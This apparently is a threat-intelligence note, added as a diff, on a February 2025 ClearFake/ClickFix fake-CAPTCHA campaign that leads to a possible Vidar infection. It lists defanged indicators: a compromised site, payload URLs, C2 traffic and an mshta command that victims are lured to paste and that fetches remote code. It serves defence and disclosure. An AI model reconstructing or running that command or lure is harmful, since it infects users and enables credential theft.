@@ -1,0 +1,24 @@
+2025-02-05 (THURSDAY): CLEARFAKE/CLICKFIX FAKE CAPTCHA LEADS TO POSSIBLE VIDAR
+
+COMPROMISED WEBSITE:
+
+- www.705arcade[.]ca
+
+INDICATOR FOR FAKE CAPTCHA TRAFFIC:
+
+- data-seed-prebsc-1-s1.bnbchain[.]org:8545
+
+EXAMPLE OF COPY/PASTE COMMAND FROM FAKE CAPTCHA INSTRUCTIONS:
+
+mshta hxxps[:]//check.djtvx[.]online/gkcxv.google?u=2e631b21-27da-4534-82b2-bc424dd0abc7 # ✅ ''I am not a robot - CAPTCHA Verification ID: 7651''
+
+TRAFFIC GENERATED AFTGER RUNNING THE COPY/PASTED SCRIPT:
+
+- hxxps[:]//check.djtvx[.]online/gkcxv.google?u=2e631b21-27da-4534-82b2-bc424dd0abc7
+- hxxps[:]//u1.galvanizegestationludicrous[.]shop/sh.mp4
+- hxxps[:]//bitlunch.smogturfprance[.]shop/e7f2-4033-awjxs.captcha
+- hxxps[:]//www.mediafire[.]com/file_premium/pzse74za05xo46l/nrjjpi.mp4/file
+
+HTTPS POST-INFECTION TRAFFIC (POSSIBLE VIDAR):
+
+- [Cloudflare IP address]:443 - eteherealpath[.]top - HTTPS, TLSv1.3 traffic
